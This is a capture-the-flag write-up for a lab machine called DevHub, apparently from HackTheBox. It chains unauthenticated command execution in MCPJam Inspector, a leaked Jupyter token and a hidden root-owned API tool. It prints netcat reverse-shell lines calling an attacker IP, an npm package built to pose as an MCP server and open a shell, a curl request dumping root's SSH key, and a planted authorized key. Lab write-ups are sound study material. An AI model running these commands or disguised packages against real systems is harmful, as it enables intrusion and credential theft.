# DevHub

## Engagement Notes

DevHub is a Linux box built around the **Model Context Protocol (MCP)** tooling
ecosystem: an internal portal on port 80 points at an MCP Inspector instance, a
Jupyter analytics environment, and a git server. The whole chain runs through
three MCP/dev-tool artifacts in sequence — an exposed inspector UI whose "add a
server" dialog is a straight command execution primitive, a credential leaked
into a process listing, and a hidden, undocumented endpoint on an internal
admin API. None of it is exotic privilege-escalation tradecraft; every step is
"the tool trusted its own input, or exposed something it shouldn't have."

## Attack path

1. **Recon** → `devhub.htb` has 22 (ssh), 80 (http), and 6274 open.
2. **Port 80** → an internal "DevHub" portal lists three tools: MCP Inspector
   (active, port 6274), a Jupyter Analytics Dashboard (internal-only,
   `localhost:8888`), and a Code Repository (maintenance mode).
3. **Port 6274** → MCPJam Inspector, unauthenticated. Its STDIO "Add Server"
   field is a literal shell command — confirmed by the UI's own placeholder
   example — and MCPJam binds `0.0.0.0` and executes that command without
   auth, which is exactly **CVE-2026-23744**. A reverse shell in that field
   lands as the low-privileged service account MCPJam runs under.
4. **Pivot to the real user** → `ps` from that shell shows `analyst`'s
   `jupyter-lab` process with its access token exposed in the command line.
   Tunnel to `localhost:8888`, browse in with the leaked token, and run a
   Python reverse shell from a notebook cell — the Jupyter kernel executes as
   `analyst`, giving real user-level access and `user.txt`.
5. **Persistence** → an SSH keypair is dropped into `analyst`'s
   `authorized_keys` to make repeated port-forwarding simpler than nursing a
   raw reverse shell.
6. **Root-owned internal API** → `ps` (again) shows `/opt/opsmcp/server.py`
   running as **root**. Its source is readable and contains a hardcoded API
   key plus a hidden tool, `ops._admin_dump`, not listed by `/tools/list` but
   still callable — it reads `/root/.ssh/id_rsa` on request.
7. **Root** → call the hidden tool through the SSH tunnel with the hardcoded
   key, get root's private key back, `ssh root@devhub.htb` with it → `root.txt`.

## Foothold — MCPJam Inspector STDIO → RCE (service account)

Port 6274 is **MCPJam Inspector**, a real open-source [MCP server debugging
platform](https://github.com/MCPJam/inspector), unauthenticated and showing
"No servers connected." Its "Add Server" dialog offers a `STDIO` connection
type whose command field is a raw shell command — the UI's own placeholder
example (an `npx` invocation) confirms that whatever is typed there gets
executed locally, no sandboxing implied:

![MCPJam Inspector's Add MCP Server dialog with connection type STDIO and the command field filled with a reverse shell one-liner](/assets/images/ctf/events/season11-htb-26/devhub/mcpjam-add-server-stdio.png)

A `busybox nc` one-liner (`busybox nc 10.10.17.14 8888 -e sh`) and a plain
Python reverse shell were both tried directly in that command field, calling
back to the attacker on port 8888 — the iteration between the two was about PTY
quality, not about getting a foothold at all.

This is the exact mechanism behind **CVE-2026-23744**: MCPJam Inspector
(≤1.4.2) binds `0.0.0.0` by default instead of `127.0.0.1`, and its
`/api/mcp/connect` endpoint takes `command`/`args` fields and spawns them
without validation or authentication — a CVSS 9.8 unauthenticated RCE.

> 🧠 The insight that mattered here was already in hand: MCPJam's STDIO
> connection type is a straight bash command by design — that's what MCP
> STDIO transport *is*, a locally spawned process. The UI's own `npx …`
> placeholder example confirmed it live. The CVE identifier came later, as
> verification, not as the thing that pointed here — the data-flow
> understanding ("this field becomes a spawned process") is what made the
> exploit obvious, independent of whether a CVE existed for it.

## Lateral movement — leaked Jupyter token → real user (`analyst`)

The shell from the MCP Inspector exploit lands as whatever low-privileged
account runs MCPJam itself — not `analyst`, and not enough to read
`user.txt`. From that shell, a process listing turns up `analyst`'s
`jupyter-lab` process with its access token passed as a plaintext command-line
argument:

```
analyst  1072  1  0 02:07 ?  00:00:06 /home/analyst/jupyter-env/bin/python3 \
  /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 \
  --no-browser --notebook-dir=/home/analyst/notebooks \
  --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 ...
```

Jupyter was listed as "Internal Only — `localhost:8888`" on the port-80
portal, so it isn't reachable directly — but it's reachable now, through the
shell already in hand. Forward it and browse in with the leaked token:

```console
$ ssh analyst@devhub.htb -i payloads/devhub -L 8888:localhost:8888 -L 5000:localhost:5000
```

![Jupyter Lab file browser reached through the SSH tunnel at localhost:8888, showing the analyst's existing quarterly_analysis.ipynb and a freshly created Untitled.ipynb](/assets/images/ctf/events/season11-htb-26/devhub/jupyter-lab-pivot.png)

Running a Python reverse shell from a notebook cell executes it inside the
Jupyter kernel — which runs as `analyst`, the account that actually owns
`user.txt`:

```console
$ nc -lvn 8889
Connection received on 10.129.245.216 33298
$ whoami
analyst
$ cd ~ && ls
jupyter-env  notebooks  user.txt
$ cat user.txt
32bf96d1be3bd1f5b1a1d5071e31393a
```

> 🧠 The first shell wasn't the target user — it was the account MCPJam
> happens to run under. The leaked Jupyter token was the pivot from "code
> execution as a service account" to "code execution as the account that
> owns the flag." Secrets baked into a process's command-line arguments are
> visible to anyone who can already run `ps` on the box, which is a low bar
> once any shell is in hand.

A key was added to `analyst`'s `authorized_keys` at this point, purely to make
repeated port-forwarding (needed again below) simpler than keeping a raw
reverse shell alive as the tunnel endpoint.

## Privilege escalation — hidden admin tool on a root-owned internal API

With `analyst` access and the tunnel already forwarding `localhost:5000`, a
process listing shows a second internal service running as **root**:
`/opt/opsmcp/server.py`. The source is readable:

```python
# analyst@devhub:/opt/opsmcp$ cat server.py
VALID_API_KEY = "opsmcp_secret_key_4f5a…0f1a"

VISIBLE_TOOLS = {
    "ops.system_status": {...}, "ops.list_services": {...},
    "ops.check_disk": {...}, "ops.view_logs": {...}
}

# Hidden tools (not in /tools/list but callable)
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": {"description": "Enable debug mode", "parameters": {}}
}

ALL_TOOLS = {**VISIBLE_TOOLS, **HIDDEN_TOOLS}
# /tools/list only ever returns VISIBLE_TOOLS — but /tools/call dispatches
# against ALL_TOOLS, so a hidden tool is reachable if you already know its name.

elif tool_name == "ops._admin_dump":
    ...
    if target == "ssh_keys":
        with open('/root/.ssh/id_rsa', 'r') as f:
            key_data = f.read()
        return jsonify({"target": "ssh_keys", "root_private_key": key_data})
```

`ops._admin_dump` is deliberately excluded from `/tools/list` but the
`/tools/call` dispatcher doesn't re-check that exclusion — any caller who
already knows the tool name (from the source, in this case) can invoke it.
Calling it with the hardcoded API key, through the tunnel, dumps root's SSH
private key:

```console
$ curl -s http://localhost:5000/tools/call \
    -H "X-API-Key: opsmcp_secret_key_4f5a…0f1a" -H "Content-Type: application/json" \
    -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}'
{"root_private_key": "-----BEGIN OPENSSH PRIVATE KEY-----\n...[elided]...", "note": "Emergency recovery key dump"}
```

```console
$ ssh root@devhub.htb -i root
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)
root@devhub:~# id
uid=0(root) gid=0(root) groups=0(root)
root@devhub:~# cat root.txt
e8cd8e87048dc0fb99cbfce23e038a4b
```

> 🧠 The tell for root was mundane: a process listing showed `server.py`
> running as root, same as it showed the Jupyter process earlier. No git
> server or code-repository involvement — the box's "Code Repository" tile
> was a dead end, not the path in. Once the source was readable, the hidden
> tool and the hardcoded key were both sitting in plain text; the only
> "exploit" was calling an undocumented API method by name.

## What didn't work

- **The "Code Repository" tile** on the port-80 portal was flagged
  `Maintenance Mode` on first look and never followed up — it played no role
  in the actual chain.
- **The Ollama model-provider configuration** inside MCPJam Inspector (a
  modal for pointing the inspector's chat feature at a local Ollama
  instance) was explored as part of getting familiar with the UI, not
  because it looked exploitable. It wasn't part of the chain.
- **A vibe-coded TypeScript "MCP server" (`payloads/my-awesome-tool`)** —
  built as an npm package (`bin` script running
  `require('child_process').exec('nc -e sh 10.10.17.14 8888')`) meant to
  masquerade as a legitimate MCP server that MCPJam would connect out to,
  rather than a command dropped straight into the STDIO field. It never got
  a shell — it only demonstrated that MCPJam would make an outbound
  connection to something impersonating a real server (SSRF), which turned
  out to be unnecessary: the direct STDIO command-execution primitive
  already worked and needed no fake server on the other end.

## Tactics (MITRE ATT&CK)

Only techniques whose definition matches what happened, each verified against
its ATT&CK page:

| Technique | ID | Where |
|---|---|---|
| Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190/) | MCPJam Inspector's unauthenticated `/api/mcp/connect` STDIO command execution (CVE-2026-23744) |
| Command and Scripting Interpreter: Unix Shell | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) | `busybox nc … -e sh` / the Python reverse shell, both spawning a shell back to the attacker |
| Process Discovery | [T1057](https://attack.mitre.org/techniques/T1057/) | `ps` used twice — to find the token-bearing `jupyter-lab` process, then to find `server.py` running as root |
| Unsecured Credentials: Credentials In Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) | Hardcoded `VALID_API_KEY` readable in `/opt/opsmcp/server.py` source |
| Unsecured Credentials: Private Keys | [T1552.004](https://attack.mitre.org/techniques/T1552/004/) | `ops._admin_dump` reading `/root/.ssh/id_rsa` on request |
| Account Manipulation: SSH Authorized Keys | [T1098.004](https://attack.mitre.org/techniques/T1098/004/) | Attacker key added to `analyst`'s `authorized_keys` for cleaner tunneling |
| Valid Accounts | [T1078](https://attack.mitre.org/techniques/T1078/) | Authenticating as root over SSH with the dumped private key |

> **Not tagged, and why:** the Jupyter access-token exposure (a secret sitting
> in a process's command-line arguments, found via `ps`) doesn't cleanly fit
> any T1552 sub-technique — those cover files, registry, shell history,
> private keys, cloud metadata, GPP, container APIs, and chat messages, but
> not command-line arguments of a running process. It's described in prose
> above rather than force-tagged. Final root access over SSH was also
> considered for **T1021.004 Remote Services: SSH**, but that technique's
> Lateral Movement framing is for moving *between* systems; this was a
> privilege change on the same host via a stolen credential, which T1078
> already covers.

## Lessons

- **Understand the data flow before hunting for a published exploit.** Time
  was spent bouncing between "is there a known CVE for this" and "what does
  this field actually do" — starting from the second question would have
  made the RCE obvious immediately: a STDIO connection type in an MCP tool
  *is* a locally spawned process, by definition of the transport. The CVE
  identifier is confirmation, not the discovery mechanism.
- **A hidden endpoint is only hidden from the endpoint that lists them.**
  Excluding a tool from `/tools/list` did nothing to stop `/tools/call` from
  dispatching to it — obscurity in a listing endpoint isn't an access
  control.
- **Process listings leak more than process names.** A token passed as a
  command-line argument is visible in `ps` to anyone who can already run it —
  which is a very low bar once any shell exists on the box.
